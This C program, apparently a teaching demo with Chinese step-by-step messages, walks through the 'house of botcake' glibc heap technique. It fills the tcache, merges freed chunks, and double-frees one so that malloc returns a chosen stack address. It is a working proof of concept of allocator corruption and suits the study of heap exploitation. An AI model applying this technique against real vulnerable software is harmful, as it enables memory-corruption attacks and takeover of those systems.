#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

int main(){
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    puts("house_of_botcake 是针对 glibc2.29 对 tcache double free 做出限制以后提出的利用方法");
    intptr_t stack_var[4];
    printf("我们希望 malloc 到的地址是 %p.\n\n", stack_var);

    puts("malloc 7 个 chunk 以便稍后填满 tcache");
    intptr_t *x[7];
    for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
        x[i] = malloc(0x100);
    }

    intptr_t *prev = malloc(0x100);
    printf("malloc(0x100): prev=%p. 待会用\n", prev); 
    intptr_t *a = malloc(0x100);
    printf("再 malloc(0x100): a=%p. 作为攻击的 chunk\n", a); 
    puts("最后 malloc(0x10) 防止与 top chunk 合并\n");
    malloc(0x10);
    
    puts("接下来构造 chunk overlapping");
    puts("第一步: 填满 tcache 链表");
    for(int i=0; i<7; i++){
        free(x[i]);
    }
    puts("第二步: free 掉 chunk a，放入 unsorted bin 中");
    free(a);
    
    puts("第三步: 释放掉 chunk prev 因为后面是一个 free chunk，所以他会与 chunk a 合并");
    free(prev);
    
    puts("第四步: 这时候已经没有指向 chunk a 的指针了，从 tcache 中取出一个，然后再次 free(a) 就把 chunk a 加入到了 tcache 中，造成了 double free \n");
    malloc(0x100);
    free(a);

    puts("再去 malloc 一个 0x120 会从 unsorted bin 中分割出来，也就控制了前面已经合并的那个 chunk a 了");
    intptr_t *b = malloc(0x120);
    puts("把 chunk a 的指针给改为前面声明的 stack_var 的地址");
    b[0x120/8-2] = (long)stack_var;
    malloc(0x100);
    puts("去 malloc 一个就能申请到 stack_var 了");
    intptr_t *c = malloc(0x100);
    printf("新申请的 chunk 在：%p\n", c);
    return 0;
}